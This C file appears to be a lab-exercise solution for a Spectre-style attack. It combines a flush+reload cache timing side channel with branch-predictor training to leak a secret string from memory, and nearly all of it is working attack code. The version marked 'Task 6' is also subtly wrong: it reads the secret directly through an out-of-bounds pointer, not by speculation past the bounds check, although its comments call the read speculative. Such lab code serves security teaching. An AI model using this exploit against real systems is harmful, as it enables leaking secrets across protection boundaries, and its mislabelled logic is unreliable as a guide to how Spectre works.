#include <emmintrin.h>
#include <x86intrin.h>
#include <stdlib.h>
#include <stdio.h>
#include <stdint.h>
#include <time.h>

#define CACHE_HIT_THRESHOLD 200
#define ATTACK_ATTEMPTS 30  // Run the attack this many times

unsigned int bound_lower = 0;
unsigned int bound_upper = 9;
uint8_t buffer[10] = {0,1,2,3,4,5,6,7,8,9};
char    *secret    = "Some Secret Value";

typedef struct datablock {
    uint8_t lpad[2048];
    uint8_t dat;
    uint8_t rpad[2047];
} DataBlock;

DataBlock array[256];

uint8_t restrictedAccess(size_t x) {
    if (x <= bound_upper && x >= bound_lower) {
        return buffer[x];
    } else {
        return 0;
    }
}

void flushSideChannel() {
    for (int i = 255; i > -1; i--)
        _mm_clflush(&array[i].dat);
}

uint64_t time_eval(uint8_t *addr) {
    unsigned int junk;
    uint64_t start = __rdtscp(&junk);
    junk = *addr;
    uint64_t end = __rdtscp(&junk);
    return end - start;
}

uint8_t reloadSideChannel() {
    uint64_t timeElapse;
    int best_index = 0;
    uint64_t best_time = UINT64_MAX;

    for (int i = 255; i > -1; i--) {
        volatile uint8_t *data = &array[i].dat;
        timeElapse = time_eval((uint8_t *)data);
        if (timeElapse < best_time) {
            best_time = timeElapse;
            best_index = i;
        }
    }

    if (best_time <= CACHE_HIT_THRESHOLD) {
        return (uint8_t)best_index;
    } else {
        return 0xFF;
    }
}

// Busy wait to avoid using sleep (keeps CPU active)
void busy_wait(int delay) {
    for (volatile int i = 0; i < delay * 100000; i++) { }
}

void spectreAttack(size_t larger_x) {
    uint8_t s;
    for (int i = 0; i < 10; i++) {
        restrictedAccess(i);  // Train predictor
    }

    _mm_clflush(&bound_upper);  // Delay the bound check
    for (int i = 0; i < 256; i++) {
        _mm_clflush(&array[i].dat);
    }

    // New version for Task 6:
    volatile uint8_t *target = (uint8_t *)buffer + larger_x;
    s = *target;   // direct speculative access to secret
    array[s].dat += 1;

}

int main() {
    for (int i = 0; i < 256; i++) {
        array[i].dat = 1;
    }

    size_t index_beyond = (size_t)((size_t)secret - (size_t)buffer);
    fprintf(stderr, "Targeting address %p at offset %zu\n", secret, index_beyond);

    int results[256] = {0};

    for (int attempt = 0; attempt < ATTACK_ATTEMPTS; attempt++) {
        flushSideChannel();
        spectreAttack(index_beyond);
        uint8_t guess = reloadSideChannel();

        if (guess != 0xFF) {
            results[guess]++;
        }

        busy_wait(10);  // Small delay between runs
    }

    // Find the most frequent guess
    int max_hits = 0;
    int most_likely_secret = -1;
    for (int i = 0; i < 256; i++) {
        if (results[i] > max_hits) {
            max_hits = results[i];
            most_likely_secret = i;
        }
    }

    printf("The secret is %d (%c).\n", most_likely_secret, most_likely_secret);
    return 0;
}
